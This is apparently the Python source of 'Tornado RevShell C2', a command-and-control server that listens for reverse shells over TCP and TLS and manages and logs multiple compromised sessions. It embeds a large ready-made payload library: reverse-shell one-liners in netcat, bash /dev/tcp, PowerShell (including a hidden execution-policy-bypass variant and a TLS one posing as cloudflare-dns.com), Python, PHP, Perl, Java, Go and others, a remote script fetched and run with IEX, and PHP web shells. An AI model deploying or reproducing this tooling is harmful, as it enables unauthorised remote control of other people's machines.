import sys,os,time,select,socket,threading,datetime,argparse,readline,ssl,tempfile,subprocess,atexit
from threading import Lock

class TORNADOREVC2:
    def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, certfile='server.pem', keyfile='server.key'):
        self.host = host
        self.revshell_port = revshell_port
        self.tls_port = tls_port
        self.certfile = certfile
        self.keyfile  = keyfile
        self.revshell_clients = {}
        self.client_counter = 0
        self.running = False
        self.current_client = None
        self.client_lock = Lock()
        self.colors = {
            'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m', 
            'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m'
        }
        self.payloads = {
            'Network Tools': {
                'nc mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.host} {self.revshell_port} >/tmp/f',
                'nc -e': f'nc {self.host} {self.revshell_port} -e sh',
                'nc.exe -e': f'nc.exe {self.host} {self.revshell_port} -e sh',
                'BusyBox nc -e': f'busybox nc {self.host} {self.revshell_port} -e sh',
                'nc -c': f'nc -c sh {self.host} {self.revshell_port}',
                'ncat -e': f'ncat {self.host} {self.revshell_port} -e sh',
                'ncat.exe -e': f'ncat.exe {self.host} {self.revshell_port} -e sh',
                'ncat udp': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {self.host} {self.revshell_port} >/tmp/f',
                'rustcat': f'rcat connect -s sh {self.host} {self.revshell_port}',
                'telnet': f'TF=$(mktemp -u);mkfifo $TF && telnet {self.host} {self.revshell_port} 0<$TF | sh 1>$TF',
                'OpenSSL': f'mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {self.host}:{self.revshell_port} > /tmp/s; rm /tmp/s',
                'socat #1': f'socat TCP:{self.host}:{self.revshell_port} EXEC:sh',
                'socat #2 (TTY)': f'socat TCP:{self.host}:{self.revshell_port} EXEC:\'sh\',pty,stderr,setsid,sigint,sane',
                'sqlite3 nc mkfifo': f'sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.host}:{self.revshell_port} >/tmp/f\''
            },
            'Bash / Zsh': {
                'Bash -i': f'sh -i >& /dev/tcp/{self.host}/{self.revshell_port} 0>&1',
                'Bash 196': f'0<&196;exec 196<>/dev/tcp/{self.host}/{self.revshell_port}; sh <&196 >&196 2>&196',
                'Bash read line': f'exec 5<>/dev/tcp/{self.host}/{self.revshell_port};cat <&5 | while read line; do $line 2>&5 >&5; done',
                'Bash 5': f'sh -i 5<> /dev/tcp/{self.host}/{self.revshell_port} 0<&5 1>&5 2>&5',
                'Bash udp': f'sh -i >& /dev/udp/{self.host}/{self.revshell_port} 0>&1',
                'zsh': f'zsh -c \'zmodload zsh/net/tcp && ztcp {self.host} {self.revshell_port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''
            },
            'PowerShell / Windows': {
                'Windows ConPty': f'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {self.host} {self.revshell_port}',
                'PowerShell #1': f"$LHOST = \"{self.host}\"; $LPORT = {self.revshell_port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
                'PowerShell #2': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.host}',{self.revshell_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                'PowerShell #3': f"powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{self.host}', {self.revshell_port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()\"",
                'PowerShell #4 (TLS)': f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{self.host}', {self.tls_port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"
            },
            'Python': {
                'Python #1': f'export RHOST="{self.host}";export RPORT={self.revshell_port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
                'Python #2': f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.host}",{self.revshell_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'',
                'Python3 #1': f'export RHOST="{self.host}";export RPORT={self.revshell_port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\'',
                'Python3 #2': f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.host}",{self.revshell_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'',
                'Python3 shortest': f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{self.host}",{self.revshell_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\''
            },
            'Ruby / Perl / PHP': {
                'Ruby #1': f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{self.host}",{self.revshell_port}))\'',
                'Ruby no sh': f"ruby -rsocket -e 'exit if fork; "f"c=TCPSocket.new(\"{self.host}\",{self.revshell_port}); "f"while(cmd=c.gets); "f"cmd.chomp!; "f"if cmd == \"exit\"; exit; "f"elsif cmd =~ /cd (.+)/; Dir.chdir($1); "f"else; "f"IO.popen(cmd, 'r') do |io| c.print io.read end; "f"end; "f"end'",
                'Perl': f"perl -e 'use Socket;$i=\"{self.host}\";$p={self.revshell_port};"f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"f"open(STDIN,\">&S\");"f"open(STDOUT,\">&S\");"f"open(STDERR,\">&S\");"f"exec(\"/bin/sh -i\");}}'",
                'Perl no sh':     f"perl -MIO -e '$p=fork;exit if($p);"f"$c=new IO::Socket::INET(PeerAddr,\"{self.host}:{self.revshell_port}\");"f"STDIN->fdopen($c,\"r\");"f"$~->fdopen($c,\"w\");"f"system $_ while <>;'",
                'PHP cmd 2': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
                'PHP cmd small': '<?=`$_GET[0]`?>',
                'PHP exec': f'php -r \'$sock=fsockopen("{self.host}",{self.revshell_port});exec("sh <&3 >&3 2>&3");\'',
                'PHP shell_exec': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"shell_exec(\"sh <&3 >&3 2>&3\");'",
                'PHP system': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"system(\"sh <&3 >&3 2>&3\");'",
                'PHP passthru': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"passthru(\"sh <&3 >&3 2>&3\");'",
                'PHP `': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"`sh <&3 >&3 2>&3`;'",
                'PHP popen': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"popen(\"sh <&3 >&3 2>&3\", \"r\");'",
                'PHP proc_open': f"php -r '$sock=fsockopen(\"{self.host}\",{self.revshell_port});"f"$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
            },
            'Compiled / Other': {
                'Haskell #1': f"""module Main where
                    import System.Process
                    main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 192.168.31.118 4444 >/tmp/f\"""",
                'node.js': f"require('child_process').exec('nc -e sh {self.host} {self.revshell_port}')",
                'node.js #2': f"(function(){{var net = require(\"net\"),cp = require(\"child_process\"),sh = cp.spawn(\"sh\", []);var client = new net.Socket();client.connect({self.revshell_port}, \"{self.host}\", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();",
                'Java #1': f"public class shell {{public static void main(String[] args) {{Process p;try {{p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{self.host}/{self.revshell_port} 0>&1\");p.waitFor();p.destroy();}} catch (Exception e) {{}}}}}}",
                'Java #2': f"public class shell {{public static void main(String[] args) {{ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{self.host}/{self.revshell_port} 0>&1\").redirectErrorStream(true);try {{Process p = pb.start();p.waitFor();p.destroy();}} catch (Exception e) {{}}}}}}",
                'Groovy': f"String host=\"{self.host}\";int port={self.revshell_port};String cmd=\"sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();",
                'Lua #1': f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{self.host}','{self.revshell_port}');os.execute('sh -i <&3 >&3 2>&3');\"",
                'Lua #2': f"lua5.1 -e 'local host, port = \"{self.host}\", {self.revshell_port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
                'Golang': f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{self.host}:{self.revshell_port}\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
                'Vlang': f"echo 'import os' > /tmp/t.v && echo 'fn main() {{ os.system(\"nc -e sh {self.host} {self.revshell_port} 0>&1\") }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
                'Awk': f"awk 'BEGIN {{s = \"/inet/tcp/0/{self.host}/{self.revshell_port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
                'Crystal (system)': f"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{self.host}\",{self.revshell_port});loop{{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}}'"
            }
        }
        
    def print_banner(self):
        banner = f"""
{self.colors['cyan']}{self.colors['bold']}
████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
   ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 

      T O R N A D O   R E V S H E L L   C 2  -  kamalx06
{self.colors['end']}
"""
        print(banner)
        active = self.get_client_count()
        print(
            f"{self.colors['green']}Listeners:{self.colors['end']}\n"
            f"  {self.colors['cyan']}TCP{self.colors['end']} {self.host}:{self.revshell_port}\n"
            f"  {self.colors['cyan']}TLS{self.colors['end']} {self.host}:{self.tls_port}\n"
            f"{self.colors['green']}Active Sessions:{self.colors['end']} {active}\n"
        )

    def get_client_count(self):
        with self.client_lock:
            alive = 0
            for sock in list(self.revshell_clients.keys()):
                try:
                    if sock.fileno() != -1:
                        alive += 1
                except:
                    pass
            return alive

    def print_payloads(self):
        for category, payloads in self.payloads.items():
            print(f"{self.colors['bold']}{category}:{self.colors['end']}")
            for name, payload in payloads.items():
                print(f"  {self.colors['green']}{name}{self.colors['end']} {self.colors['yellow']}{payload}")
            print()

    def create_tls_context(self):
        if not os.path.exists(self.certfile):
            raise FileNotFoundError(f"Certificate not found: {self.certfile}")
        if not os.path.exists(self.keyfile):
            raise FileNotFoundError(f"Key not found: {self.keyfile}")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            context.load_cert_chain(certfile=self.certfile,keyfile=self.keyfile)
        except Exception as e:
            print(f"Error: {e}")
            raise
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        context.set_ecdh_curve("X25519")
        context.options |= ssl.OP_NO_COMPRESSION
        context.options |= ssl.OP_NO_RENEGOTIATION
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        return context

    def send_to_revshell(self, client_sock, cmd):
        try:
            client_sock.sendall((cmd + "\n").encode())
            return True
        except:
            self.cleanup_client(client_sock)
            return False

    def recv_output(self, client_sock, timeout=1.0):
        data = b""
        end = time.time() + timeout
        while time.time() < end:
            try:
                r, _, _ = select.select([client_sock], [], [], end - time.time())
                if not r:
                    break
                chunk = client_sock.recv(4096)
                if not chunk:
                    self.cleanup_client(client_sock)
                    return ""
                data += chunk
                end = time.time() + 0.2
            except Exception:
                self.cleanup_client(client_sock)
                return ""
        return data.decode(errors="ignore")

    def print_status(self):
        active = self.get_client_count()
        print(f"\n{self.colors['cyan']}STATUS | Active: {active}{self.colors['end']}")
        if active == 0:
            print(f"{self.colors['red']}No Active Clients{self.colors['end']}")
        else:
            print(f"{self.colors['green']}Active Clients:{self.colors['end']}")
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                if sock.fileno() != -1:
                    if sock == self.current_client:
                        status = f"CURRENT"
                    else:
                        status = ""
                    if info.get('tls'):
                        proto = "TLS" 
                    else:
                        proto = "TCP"
                    display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
                    print(f"{display} {info['addr'][0]}:{info['addr'][1]} {proto}")



    def infer_platform(self, output):
        osver = output.lower()
        if "windows" in osver or "microsoft" in osver or "c:\\" in osver:
            return "windows"
        if "uid=" in osver or "linux" in osver or "darwin" in osver:
            return "unix"
        if "busybox" in osver or "/bin/sh" in osver:
            return "unix"
        return "unknown"

    def get_host_info(self, client_sock):
        with self.client_lock:
            info = self.revshell_clients.get(client_sock)
            if not info:
                return "disconnected"
            display = info["name"] if info.get("name") else f"#{info['id']}"
            return f"{display}@{info['addr'][0]}:{info['addr'][1]}"

    def client_shell_menu(self, client_sock):
        with self.client_lock:
            info = self.revshell_clients[client_sock]
        host_info = self.get_host_info(client_sock)
        shell_type = info.get('type', 'unix')
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['green']}CLIENT SHELL: {host_info} ({shell_type.upper()}) {self.colors['end']}")
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['yellow']}'exit(e)/quit(q) or Ctrl+C for main menu{self.colors['end']}\n")        
        sys.stdout.flush()
        host_info = self.get_host_info(client_sock)
        print(f"{self.colors['cyan']}{host_info} {shell_type}>{self.colors['end']} ", end='', flush=True)
        ip = info['addr'][0]
        os_type = info.get('type', 'unknown')
        client_log = info["name"] if info.get("name") else f"#{info['id']}"
        logtime = datetime.datetime.now().strftime("%d-%m-%Y")
        session_id = f"rev_{client_log}_{ip}_{os_type}_{logtime}"
        def log_output(cmd, output):
            os.makedirs("logs", exist_ok=True)
            with open(f"logs/{session_id}.log", "a", encoding='utf-8') as f:
                f.write(f"[{datetime.datetime.now()}] $ {cmd}\n{output}\n\n")
        while True:
            try:
                host_info = self.get_host_info(client_sock)
                cmd = input(f"\r{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ").strip()
                sys.stdout.flush()
                if cmd.lower() in ['exit', 'quit', 'e', 'q']:
                    break
                if not cmd:
                    host_info = self.get_host_info(client_sock)
                    print(f"\r{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ", end='', flush=True)
                    continue
                print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
                sys.stdout.flush()
                if self.send_to_revshell(client_sock, cmd):
                    output = self.recv_output(client_sock)
                    host_info = self.get_host_info(client_sock)
                    print(f"\r{output}\n{self.colors['green']}{host_info}{self.colors['end']} {self.colors['cyan']}{shell_type}>{self.colors['end']} ", end='', flush=True)
                    log_output(cmd, output)
                else:
                    print(f"\r{self.colors['red']}Connection lost{self.colors['end']}")
                    break
            except KeyboardInterrupt:
                break
            except EOFError:
                break

    def main_menu(self):
        while self.running:
            try:
                cmd = input(f"{self.colors['green']}tornado> {self.colors['end']}")
                if not cmd.strip():
                    continue
                cmd_parts = cmd.strip().split()
                cmd_lower = cmd_parts[0].lower()                
                if cmd_lower == 'payloads':
                    self.print_payloads()

                elif cmd_lower == 'status' or cmd_lower == 'ls':
                    self.print_status()
                        
                elif cmd_lower == 'switch':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
                        continue
                    try:
                        client_id = int(cmd_parts[1])
                        client_sock = None
                        with self.client_lock:
                            for sock, info in self.revshell_clients.items():
                                if info['id'] == client_id:
                                    client_sock = sock
                                    break
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{client_id} not active{self.colors['end']}")
                            continue
                        display = self.get_host_info(client_sock).split("@")[0]
                        print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
                        self.client_shell_menu(client_sock)
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}") 

                elif cmd_lower == 'kill':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: kill <ID>{self.colors['end']}")
                        continue
                    try:
                        client_id = int(cmd_parts[1])
                        client_sock = None
                        with self.client_lock:
                            for sock, info in self.revshell_clients.items():
                                if info['id'] == client_id:
                                    client_sock = sock
                                    break
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
                            continue
                        self.cleanup_client(client_sock)
                        print(f"{self.colors['green']}Client #{client_id} terminated{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")

                elif cmd_lower == 'exit' or cmd_lower == 'quit' or cmd_lower == 'e' or cmd_lower == 'q':
                    print(f"\n{self.colors['red']}Shutting down server{self.colors['end']}")
                    self.running = False
                    break

                elif cmd.lower() in ("clear", "cls"):
                    if os.name == "nt":
                        os.system("cls")
                    else:
                        os.system("clear")
                    self.print_banner()
                    continue

                elif cmd_lower in ("rename", "rn"):
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
                        continue
                    try:
                        changed_id = int(cmd_parts[1])
                        new_name = " ".join(cmd_parts[2:]).strip()
                        if not new_name:
                            raise ValueError
                        with self.client_lock:
                            for info in self.revshell_clients.values():
                                if info["id"] == changed_id:
                                    info["name"] = new_name
                                    print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
                                    break
                            else:
                                print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")

                elif cmd_lower == 'help':
                    print(f"""
    {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
    switch <ID>             Client Interaction
    kill <ID>               Terminate client 
    status/ls               Show active clients
    rename/rn <ID> <name>   Rename session
    payloads                Show payloads list
    clear/cls               Clear screen
    help                    This help menu
    exit/quit               Shutdown server""")

            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")

    def cleanup_client(self, client_sock):
        info = None
        with self.client_lock:
            info = self.revshell_clients.pop(client_sock, None)
        if not info:
            return
        try:
            client_sock.close()
        except:
            pass
        remaining = len(self.revshell_clients)
        display = info["name"] if info.get("name") else f"#{info['id']}"
        print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")

    def handle_client(self, client_sock, addr):
        self.client_counter += 1
        client_id = self.client_counter
        client_info = {
            'sock': client_sock,
            'addr': addr,
            'type': 'unknown',
            'id': client_id,
            'name': None,
            'tls': isinstance(client_sock, ssl.SSLSocket),
            'pty': False,
            'init': False
        }
        with self.client_lock:
            self.revshell_clients[client_sock] = client_info
        self.send_to_revshell(
            client_sock,
            "uname -a 2>/dev/null || "
            "ver || "
            "cmd /c ver"
        )
        output = self.recv_output(client_sock)
        inferred = self.infer_platform(output)
        client_info['type'] = inferred
        if inferred == 'unix':
            self.send_to_revshell(
                client_sock,
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' "
                "|| python -c 'import pty; pty.spawn(\"/bin/sh\")' "
                "|| /bin/sh"
            )
            client_info['pty'] = True
        elif inferred == 'windows':
            self.send_to_revshell(client_sock,"$ProgressPreference='SilentlyContinue'")
            client_info['init'] = True
        print(f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} ({inferred.upper()}) | switch {client_id}{self.colors['end']}")

    def start(self):
        self.print_banner()
        tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind((self.host, self.revshell_port))
        tcp_server.listen(100)
        tls_context = self.create_tls_context()
        tls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tls_server.bind((self.host, self.tls_port))
        tls_server.listen(100)
        self.running = True
        threading.Thread(target=self.listener,args=(tcp_server, False),daemon=True).start()
        threading.Thread(target=self.listener,args=(tls_server, True, tls_context),daemon=True).start()
        self.main_menu()
        self.running = False

    def listener(self, server, use_tls=False, tls_context=None):
        while self.running:
            try:
                client_sock, addr = server.accept()
                if use_tls:
                    try:
                        client_sock = tls_context.wrap_socket(client_sock,server_side=True)
                    except ssl.SSLError:
                        client_sock.close()
                        continue
                t = threading.Thread(target=self.handle_client,args=(client_sock, addr),daemon=True)
                t.start()
            except:
                break

def main():
    parser = argparse.ArgumentParser(description='TornadoRevC2')
    parser.add_argument('-H','--host',default='0.0.0.0',help='Bind address')
    parser.add_argument('-p','--port',type=int,default=4444,help='TCP listener port')
    parser.add_argument('-tp','--tls-port',type=int,default=8443,help='TLS listener port')
    parser.add_argument('-c','--cert',default='server.pem',help='TLS certificate file')
    parser.add_argument('-k','--key',default='server.key',help='TLS private key file')
    args = parser.parse_args()
    srv = TORNADOREVC2(host=args.host,revshell_port=args.port,tls_port=args.tls_port,certfile=args.cert,keyfile=args.key)
    srv.start()

if __name__ == "__main__":
    main()
